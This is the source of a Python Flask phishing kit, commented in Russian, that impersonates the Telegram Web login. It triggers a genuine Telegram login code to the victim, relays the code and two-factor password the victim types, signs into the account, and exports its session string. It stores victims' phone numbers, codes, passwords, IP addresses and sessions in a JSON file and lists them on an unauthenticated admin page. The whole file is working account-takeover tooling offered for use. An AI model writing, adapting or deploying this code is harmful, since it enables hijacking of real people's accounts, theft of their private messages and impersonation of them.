import os
import asyncio
import json
import logging
from datetime import datetime
from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, 
    PhoneNumberInvalid, PhoneCodeExpired
)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(32)

# 🔐 ПРОВЕРКА API КЛЮЧЕЙ
def check_api_keys():
    api_id = os.getenv('TELEGRAM_API_ID')
    api_hash = os.getenv('TELEGRAM_API_HASH')
    
    logger.info(f"🔍 Проверка API ключей: ID={api_id}, HASH={'*' * 10 if api_hash else 'None'}")
    
    if not api_id or not api_hash:
        logger.error("❌ API ключи не установлены!")
        return False
    
    if not api_id.isdigit():
        logger.error("❌ API ID должен быть числом!")
        return False
        
    logger.info("✅ API ключи валидны")
    return True

# Конфигурация
API_ID = os.getenv('TELEGRAM_API_ID', '').strip()
API_HASH = os.getenv('TELEGRAM_API_HASH', '').strip()

# Хранилища
VICTIMS_DATA = []
ACTIVE_SESSIONS = {}

class RealTelegramPhisher:
    def __init__(self):
        if not API_ID or not API_HASH:
            logger.critical("🚫 API ключи не настроены! Фишинг не будет работать.")
            self.initialized = False
            return
            
        try:
            self.api_id = int(API_ID)
            self.api_hash = API_HASH
            self.initialized = True
            logger.info(f"✅ Фишинг инициализирован с API ID: {self.api_id}")
        except ValueError:
            logger.error("❌ Неверный формат API ID")
            self.initialized = False
        
    async def start_phishing_attack(self, phone_number):
        """Начинаем реальную фишинг-атаку через Telegram API"""
        if not self.initialized:
            return {
                'success': False, 
                'error': 'Система не инициализирована. Проверьте API ключи.'
            }
            
        try:
            logger.info(f"🎯 Начало реальной фишинг-атаки для: {phone_number}")
            
            # Создаем уникальную сессию
            session_id = f"phish_{int(datetime.now().timestamp())}"
            
            # Создаем Telegram клиент
            client = TelegramClient(
                StringSession(""),
                self.api_id,
                self.api_hash
            )
            
            await client.connect()
            
            # Отправляем реальный код через Telegram API
            sent_code = await client.send_code(phone_number)
            
            # Сохраняем сессию
            ACTIVE_SESSIONS[session_id] = {
                'client': client,
                'phone': phone_number,
                'phone_code_hash': sent_code.phone_code_hash,
                'status': 'code_sent',
                'created_at': datetime.now().isoformat(),
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent')
            }
            
            logger.info(f"📱 Реальный код отправлен Telegram на {phone_number}")
            
            return {
                'success': True,
                'session_id': session_id,
                'message': f'Код отправлен на {phone_number}',
                'next_step': 'enter_code',
                'is_real_telegram': True
            }
            
        except PhoneNumberInvalid:
            logger.error(f"❌ Неверный номер телефона: {phone_number}")
            return {
                'success': False,
                'error': 'Неверный номер телефона'
            }
        except Exception as e:
            logger.error(f"❌ Ошибка отправки кода: {e}")
            return {
                'success': False,
                'error': f'Ошибка Telegram API: {str(e)}'
            }
    
    async def process_victim_code(self, session_id, entered_code):
        """Обрабатываем код, введенный жертвой"""
        if not self.initialized:
            return {'success': False, 'error': 'Система не инициализирована'}
            
        try:
            if session_id not in ACTIVE_SESSIONS:
                return {'success': False, 'error': 'Сессия не найдена'}
            
            session_data = ACTIVE_SESSIONS[session_id]
            client = session_data['client']
            phone = session_data['phone']
            phone_code_hash = session_data['phone_code_hash']
            
            logger.info(f"🔐 Жертва ввела код: {entered_code} для {phone}")
            
            # Сохраняем перехваченный код
            victim_data = {
                'session_id': session_id,
                'phone': phone,
                'entered_code': entered_code,
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent'),
                'code_entered_at': datetime.now().isoformat(),
                'status': 'code_captured'
            }
            
            try:
                # Пытаемся войти с кодом жертвы
                signed_in = await client.sign_in(
                    phone_number=phone,
                    phone_code_hash=phone_code_hash,
                    phone_code=entered_code
                )
                
                # УСПЕХ! Получили доступ к аккаунту
                session_string = await client.export_session_string()
                
                victim_data.update({
                    'status': 'FULL_ACCESS_GRANTED',
                    'session_string': session_string,
                    'user_id': signed_in.id,
                    'first_name': signed_in.first_name,
                    'last_name': signed_in.last_name,
                    'username': signed_in.username,
                    'compromised_at': datetime.now().isoformat()
                })
                
                VICTIMS_DATA.append(victim_data)
                self.save_victims_data()
                
                logger.critical(f"🎉 ПОЛНЫЙ ДОСТУП ПОЛУЧЕН! Аккаунт {phone} скомпрометирован!")
                
                return {
                    'success': True,
                    'message': '✅ Авторизация успешна!',
                    'next_step': 'complete',
                    'redirect': '/success',
                    'compromise_level': 'FULL_ACCESS',
                    'victim_data': victim_data
                }
                
            except SessionPasswordNeeded:
                # Требуется пароль 2FA
                victim_data['status'] = 'NEED_PASSWORD'
                VICTIMS_DATA.append(victim_data)
                
                session_data['status'] = 'need_password'
                ACTIVE_SESSIONS[session_id] = session_data
                
                logger.info(f"🔒 Требуется пароль 2FA для {phone}")
                
                return {
                    'success': True,
                    'message': '🔒 Требуется пароль от облачного хранилища',
                    'next_step': 'enter_password',
                    'compromise_level': 'CODE_CAPTURED'
                }
                
            except PhoneCodeInvalid:
                logger.warning(f"⚠️ Неверный код от жертвы {phone}")
                return {
                    'success': False,
                    'error': 'Неверный код подтверждения'
                }
                
            except PhoneCodeExpired:
                logger.warning(f"⚠️ Просроченный код от жертвы {phone}")
                return {
                    'success': False,
                    'error': 'Код подтверждения просрочен'
                }
                
        except Exception as e:
            logger.error(f"❌ Ошибка обработки кода: {e}")
            return {
                'success': False,
                'error': f'Системная ошибка: {str(e)}'
            }
    
    async def process_victim_password(self, session_id, password):
        """Обрабатываем пароль, введенный жертвой"""
        if not self.initialized:
            return {'success': False, 'error': 'Система не инициализирована'}
            
        try:
            if session_id not in ACTIVE_SESSIONS:
                return {'success': False, 'error': 'Сессия не найдена'}
            
            session_data = ACTIVE_SESSIONS[session_id]
            client = session_data['client']
            phone = session_data['phone']
            
            logger.info(f"🔑 Жертва ввела пароль для {phone}")
            
            try:
                # Входим с паролем жертвы
                signed_in = await client.sign_in(password=password)
                
                # УСПЕХ! Полный доступ с паролем
                session_string = await client.export_session_string()
                
                victim_data = {
                    'session_id': session_id,
                    'phone': phone,
                    'password': password,
                    'session_string': session_string,
                    'user_id': signed_in.id,
                    'first_name': signed_in.first_name,
                    'last_name': signed_in.last_name,
                    'username': signed_in.username,
                    'ip': request.remote_addr,
                    'user_agent': request.headers.get('User-Agent'),
                    'compromised_at': datetime.now().isoformat(),
                    'status': 'FULL_ACCESS_WITH_PASSWORD',
                    'has_2fa': True
                }
                
                VICTIMS_DATA.append(victim_data)
                self.save_victims_data()
                
                logger.critical(f"🎉 ПОЛНЫЙ ДОСТУП С ПАРОЛЕМ! Аккаунт {phone} скомпрометирован!")
                
                return {
                    'success': True,
                    'message': '✅ Авторизация успешна!',
                    'next_step': 'complete',
                    'redirect': '/success',
                    'compromise_level': 'FULL_ACCESS_WITH_PASSWORD',
                    'victim_data': victim_data
                }
                
            except Exception as e:
                logger.warning(f"⚠️ Неверный пароль от жертвы {phone}: {e}")
                return {
                    'success': False,
                    'error': 'Неверный пароль'
                }
                
        except Exception as e:
            logger.error(f"❌ Ошибка обработки пароля: {e}")
            return {
                'success': False,
                'error': f'Системная ошибка: {str(e)}'
            }
    
    def save_victims_data(self):
        """Сохраняем данные жертв в файл"""
        try:
            with open('compromised_accounts.json', 'w', encoding='utf-8') as f:
                json.dump({
                    'victims': VICTIMS_DATA,
                    'total_compromised': len(VICTIMS_DATA),
                    'last_update': datetime.now().isoformat(),
                    'full_access_count': len([v for v in VICTIMS_DATA if 'FULL_ACCESS' in v.get('status', '')])
                }, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения данных: {e}")

# Инициализация фишера
phisher = RealTelegramPhisher()

# Синхронные обертки для асинхронных методов
def run_async(coro):
    return asyncio.run(coro)

# 🎯 Маршруты
@app.route('/')
def index():
    """Главная фишинговая страница"""
    status = "✅ СИСТЕМА АКТИВНА" if phisher.initialized else "❌ СИСТЕМА НЕ ГОТОВА"
    status_color = "success" if phisher.initialized else "error"
    
    return f'''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #18222d;
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .auth-container {{
            width: 100%;
            max-width: 400px;
            background: #1e2a38;
            border-radius: 15px;
            padding: 40px 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }}
        .logo {{
            text-align: center;
            font-size: 48px;
            margin-bottom: 20px;
        }}
        .title {{
            text-align: center;
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 500;
        }}
        .subtitle {{
            text-align: center;
            color: #8a8a8a;
            margin-bottom: 30px;
        }}
        .input-group {{
            margin-bottom: 20px;
        }}
        .input-label {{
            display: block;
            margin-bottom: 8px;
            color: #8a8a8a;
            font-size: 14px;
        }}
        .input-field {{
            width: 100%;
            padding: 15px;
            background: #2b3b4d;
            border: 1px solid #3d5368;
            border-radius: 8px;
            color: white;
            font-size: 16px;
        }}
        .input-field:focus {{
            outline: none;
            border-color: #0088cc;
        }}
        .btn {{
            width: 100%;
            padding: 15px;
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }}
        .btn:hover {{
            background: #0077bb;
        }}
        .btn:disabled {{
            background: #2b3b4d;
            cursor: not-allowed;
        }}
        .step {{
            display: none;
        }}
        .step.active {{
            display: block;
        }}
        .alert {{
            padding: 12px;
            border-radius: 8px;
            margin: 15px 0;
            font-size: 14px;
        }}
        .alert.success {{
            background: #1a3a2e;
            color: #4ade80;
            border: 1px solid #2d5c47;
        }}
        .alert.error {{
            background: #3a2a2a;
            color: #f87171;
            border: 1px solid #5c3d3d;
        }}
        .status-indicator {{
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 12px;
            margin-bottom: 15px;
            text-align: center;
            border: 1px solid;
        }}
        .status-success {{
            background: #1a3a2e;
            color: #4ade80;
            border-color: #2d5c47;
        }}
        .status-error {{
            background: #3a2a2a;
            color: #f87171;
            border-color: #5c3d3d;
        }}
    </style>
</head>
<body>
    <div class="auth-container">
        <div class="logo">✈️</div>
        <h1 class="title">Telegram Web</h1>
        <p class="subtitle">Войдите в свой аккаунт Telegram</p>
        
        <div class="status-indicator {status_color}">
            {status}
        </div>
        
        <!-- Шаг 1: Телефон -->
        <div id="stepPhone" class="step active">
            <div class="input-group">
                <label class="input-label">Номер телефона</label>
                <input type="tel" id="phoneInput" class="input-field" placeholder="+7 912 345-67-89" required>
            </div>
            <button class="btn" onclick="startRealPhishing()" id="phoneBtn">Получить код</button>
        </div>
        
        <!-- Шаг 2: Код -->
        <div id="stepCode" class="step">
            <div class="alert success" id="codeAlert">
                📱 Код отправлен на <span id="phoneDisplay"></span>
            </div>
            <div class="input-group">
                <label class="input-label">Введите код из Telegram</label>
                <input type="text" id="codeInput" class="input-field" placeholder="12345" required>
            </div>
            <button class="btn" onclick="submitRealCode()" id="codeBtn">Продолжить</button>
        </div>
        
        <!-- Шаг 3: Пароль -->
        <div id="stepPassword" class="step">
            <div class="alert success">
                🔒 Введите пароль от облачного хранилища
            </div>
            <div class="input-group">
                <label class="input-label">Пароль</label>
                <input type="password" id="passwordInput" class="input-field" placeholder="••••••••" required>
            </div>
            <button class="btn" onclick="submitRealPassword()" id="passwordBtn">Войти</button>
        </div>
        
        <div id="alertContainer"></div>
    </div>

    <script>
        let currentSessionId = '';
        let currentPhone = '';

        function showStep(step) {{
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(`step${{step}}`).classList.add('active');
        }}

        function showAlert(message, type = 'success') {{
            const container = document.getElementById('alertContainer');
            container.innerHTML = `<div class="alert ${{type}}">${{message}}</div>`;
        }}

        async function startRealPhishing() {{
            const phone = document.getElementById('phoneInput').value.trim();
            if (!phone) {{
                showAlert('Введите номер телефона', 'error');
                return;
            }}

            currentPhone = phone;
            const btn = document.getElementById('phoneBtn');
            btn.disabled = true;
            btn.textContent = 'Отправка запроса в Telegram...';

            try {{
                const response = await fetch('/api/real/start', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{phone: phone}})
                }});
                
                const data = await response.json();
                
                if (data.success) {{
                    currentSessionId = data.session_id;
                    document.getElementById('phoneDisplay').textContent = phone;
                    showStep('Code');
                    showAlert('✅ Запрос отправлен в Telegram. Ожидайте код.', 'success');
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                showAlert('❌ Ошибка сети', 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Получить код';
            }}
        }}

        async function submitRealCode() {{
            const code = document.getElementById('codeInput').value.trim();
            if (!code) {{
                showAlert('Введите код', 'error');
                return;
            }}

            const btn = document.getElementById('codeBtn');
            btn.disabled = true;
            btn.textContent = 'Проверка кода...';

            try {{
                const response = await fetch('/api/real/code', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        session_id: currentSessionId,
                        code: code,
                        phone: currentPhone
                    }})
                }});
                
                const data = await response.json();
                
                if (data.success) {{
                    if (data.next_step === 'enter_password') {{
                        showStep('Password');
                        showAlert('✅ Код принят. Введите пароль.', 'success');
                    }} else {{
                        window.location.href = data.redirect || '/success';
                    }}
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                showAlert('❌ Ошибка сети', 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Продолжить';
            }}
        }}

        async function submitRealPassword() {{
            const password = document.getElementById('passwordInput').value;
            if (!password) {{
                showAlert('Введите пароль', 'error');
                return;
            }}

            const btn = document.getElementById('passwordBtn');
            btn.disabled = true;
            btn.textContent = 'Проверка пароля...';

            try {{
                const response = await fetch('/api/real/password', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        session_id: currentSessionId,
                        password: password,
                        phone: currentPhone
                    }})
                }});
                
                const data = await response.json();
                
                if (data.success) {{
                    window.location.href = data.redirect || '/success';
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                showAlert('❌ Ошибка сети', 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Войти';
            }}
        }}

        // Обработчики Enter
        document.getElementById('phoneInput').addEventListener('keypress', e => {{
            if (e.key === 'Enter') startRealPhishing();
        }});
        document.getElementById('codeInput').addEventListener('keypress', e => {{
            if (e.key === 'Enter') submitRealCode();
        }});
        document.getElementById('passwordInput').addEventListener('keypress', e => {{
            if (e.key === 'Enter') submitRealPassword();
        }});
    </script>
</body>
</html>
'''

@app.route('/api/real/start', methods=['POST'])
def api_real_start():
    """Начинаем реальную фишинг-атаку"""
    data = request.get_json()
    phone = data.get('phone', '').strip()
    
    if not phone:
        return jsonify({'success': False, 'error': 'Введите номер телефона'})
    
    result = run_async(phisher.start_phishing_attack(phone))
    return jsonify(result)

@app.route('/api/real/code', methods=['POST'])
def api_real_code():
    """Обрабатываем код от жертвы"""
    data = request.get_json()
    session_id = data.get('session_id')
    code = data.get('code', '').strip()
    
    if not session_id or not code:
        return jsonify({'success': False, 'error': 'Введите код и session_id'})
    
    result = run_async(phisher.process_victim_code(session_id, code))
    return jsonify(result)

@app.route('/api/real/password', methods=['POST'])
def api_real_password():
    """Обрабатываем пароль от жертвы"""
    data = request.get_json()
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not session_id or not password:
        return jsonify({'success': False, 'error': 'Введите пароль и session_id'})
    
    result = run_async(phisher.process_victim_password(session_id, password))
    return jsonify(result)

@app.route('/success')
def success():
    """Страница успеха"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Telegram</title>
        <style>
            body {{ 
                font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
                background: #18222d; 
                color: white; 
                margin: 0; 
                padding: 20px;
                display: flex;
                align-items: center;
                justify-content: center;
                min-height: 100vh;
            }}
            .container {{ 
                max-width: 400px; 
                text-align: center; 
            }}
            .logo {{ 
                font-size: 48px; 
                margin-bottom: 20px; 
            }}
            .btn {{ 
                background: #0088cc; 
                color: white; 
                padding: 15px 30px; 
                border: none; 
                border-radius: 10px; 
                font-size: 16px; 
                cursor: pointer;
                margin-top: 20px;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">✈️</div>
            <h1>Добро пожаловать в Telegram!</h1>
            <p>Ваш аккаунт успешно подключен.</p>
            <button class="btn" onclick="window.close()">Закрыть</button>
        </div>
    </body>
    </html>
    '''

@app.route('/admin')
def admin():
    """Админка с компрометированными данными"""
    return jsonify({
        'total_victims': len(VICTIMS_DATA),
        'full_access_count': len([v for v in VICTIMS_DATA if 'FULL_ACCESS' in v.get('status', '')]),
        'victims': VICTIMS_DATA,
        'active_sessions': len(ACTIVE_SESSIONS),
        'api_initialized': phisher.initialized,
        'api_id': API_ID if phisher.initialized else 'NOT_SET'
    })

@app.route('/health')
def health():
    """Проверка здоровья"""
    return jsonify({
        'status': 'REAL_PHISHING_ACTIVE' if phisher.initialized else 'API_KEYS_MISSING',
        'victims_count': len(VICTIMS_DATA),
        'api_connected': phisher.initialized,
        'timestamp': datetime.now().isoformat(),
        'api_id_set': bool(API_ID),
        'api_hash_set': bool(API_HASH)
    })

if __name__ == '__main__':
    # Проверяем API ключи при запуске
    check_api_keys()
    app.run(host='0.0.0.0', port=8080, debug=False)
